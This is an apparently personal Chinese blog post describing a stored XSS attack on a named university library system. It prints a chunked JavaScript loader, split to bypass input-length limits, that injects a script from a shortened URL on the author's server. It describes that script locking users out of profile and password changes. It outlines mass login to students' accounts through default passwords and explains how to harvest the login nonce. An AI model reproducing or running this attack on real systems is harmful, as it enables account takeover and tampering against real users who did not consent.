---
layout: post
title: 图书馆系统的XSS漏洞
categories: demos
tags: XSS
---


![攻击环境](/assets/dist/img/2016-11-06 14-33-51屏幕截图.png)  
本想在一个输入框内植入所有代码，然而后端限制输入长度，故只能将代码切割，然后依次植入。  
因为各个脚本均在同一上下文环境中执行，故可以切。  
另，这里攻击脚本的链接可以使用短地址。  
植入的脚本如下，唯一的功能是引入我[服务器上的脚本](//dwz.cn/2qFuMT)，要干的事都在上面写。
{% highlight javascript %}
p=$('body')
a=$('<script>')
b='//dwz.cn'
b+='/2qFuMT'
a[0].src=b
p.append(a)
{% endhighlight %}

服务器的那个脚本一看就懂没啥好说，主要是关掉修改资料和密码的入口。  
大多人没修改默认密码，随便找个后端语言（比如python）跑一遍，全校学生的帐号基本上都会被植入。   

登录图书馆系统除了提交帐号密码外还要一个随机码。  
打开[首页](///al.lib.xidian.edu.cn/)，"登录"这一链接上就藏有随机码。  
看下登录时的post请求就知道，会同时提交这个随机码。  

我没有恶意，纯粹是为了学习哈，没有在脚本里面乱搞。  
请不要插入广告，做些恶趣味的事。
